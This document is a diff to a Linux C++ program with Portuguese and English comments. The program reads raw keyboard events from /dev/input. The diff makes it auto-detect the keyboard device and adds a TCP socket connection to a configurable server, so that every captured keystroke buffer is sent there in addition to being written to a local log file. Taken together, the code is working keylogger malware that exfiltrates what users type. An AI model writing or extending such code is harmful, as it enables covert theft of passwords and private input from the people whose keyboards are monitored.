@@ -4,15 +4,62 @@
 #include <unistd.h>
 #include <fcntl.h>
 #include <linux/input.h>
+#include <sys/ioctl.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <linux/input-event-codes.h>
 
 using namespace std;
 
+// IP address and port of socket server
+const string SERVER_IP = "127.0.0.1";  // Put your server IP here
+const int SERVER_PORT = 12345;         // Put your server port here
+
 int main() {
     string keys;
-    int keyboard_fd = open("/dev/input/eventX", O_RDONLY); // Substitua "eventX" pelo dispositivo de teclado correto
+    int keyboard_fd = -1;
+
+    // Identify the keyboard device
+    for (int i = 0; i <= 32; i++) {
+        string dev_path = "/dev/input/event" + to_string(i);
+        keyboard_fd = open(dev_path.c_str(), O_RDONLY | O_NONBLOCK);
+        if (keyboard_fd != -1) {
+            char name[256] = "Unknown";
+            if (ioctl(keyboard_fd, EVIOCGNAME(sizeof(name)), name) < 0) {
+                cout << "Erro ao obter o nome do dispositivo de teclado." << endl;
+                close(keyboard_fd);
+                return 1;
+            }
+            if (string(name).find("keyboard") != string::npos) {
+                // keyboard device found
+                break;
+            }
+            close(keyboard_fd);
+        }
+    }
 
     if (keyboard_fd == -1) {
-        cout << "Erro ao abrir o dispositivo de teclado." << endl;
+        cout << "Nenhum dispositivo de teclado encontrado." << endl;
+        return 1;
+    }
+
+    int socket_fd = socket(AF_INET, SOCK_STREAM, 0);
+    if (socket_fd == -1) {
+        cout << "Erro ao criar o socket." << endl;
+        return 1;
+    }
+
+    // Connecting to socket server
+    struct sockaddr_in serverAddr{};
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port = htons(SERVER_PORT);
+    if (inet_pton(AF_INET, SERVER_IP.c_str(), &(serverAddr.sin_addr)) <= 0) {
+        cout << "Endereço IP inválido." << endl;
+        return 1;
+    }
+    if (connect(socket_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
+        cout << "Erro ao conectar ao servidor." << endl;
         return 1;
     }
 
@@ -30,7 +77,7 @@ int main() {
                     cout << "b";
                     keys += "b";
                     break;
-                // Adicione casos para as outras teclas aqui...
+                // Add cases for the other keys here...
 
                 case KEY_ENTER:
                     cout << "<br>";
@@ -49,12 +96,19 @@ int main() {
             }
 
             ofstream myfile;
-            myfile.open("/home/user/log.txt", ios::app); // Substitua "/home/user/log.txt" pelo caminho e nome de arquivo desejado
+            myfile.open("/home/user/log.txt", ios::app); // Replace "/home/user/log.txt" with your desired path and file name
             myfile << keys;
             myfile.close();
+
+            // Send data to socket server
+            if (send(socket_fd, keys.c_str(), keys.length(), 0) == -1) {
+                cout << "Erro ao enviar os dados para o servidor." << endl;
+                return 1;
+            }
         }
     }
 
     close(keyboard_fd);
+    close(socket_fd);
     return 0;
 }
